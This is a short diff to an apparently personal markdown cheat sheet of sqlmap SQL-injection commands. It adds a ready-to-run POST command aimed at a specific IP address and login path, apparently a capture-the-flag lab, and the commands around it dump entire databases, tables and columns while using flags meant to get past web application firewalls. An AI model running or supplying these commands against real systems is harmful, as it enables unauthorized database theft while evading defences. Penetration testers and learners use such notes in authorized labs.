@@ -29,10 +29,15 @@ sqlmap - u "url?prm=" -p prm -D dbname  --dump
  
 * **Optimised Url**
 
+ For GET Request
 ```
 sqlmap -u "url?prm=" -p prm -D dbname -T table_name -C column_name --dump --method GET --code 200 --skip-waf --random-agent --threads 10 -o
 ```
+ For POST Request
+```
+sqlmap -u "http://35.227.24.107/ab6ad62d13/login" --data "username=a&password=b&xyz=c" -p "username,password" --method POST --skip-waf --random-agent --threads 10 -o --dbs --dump
 
+```
 
 <h2> SQL Injection Confirmation<h2>
  
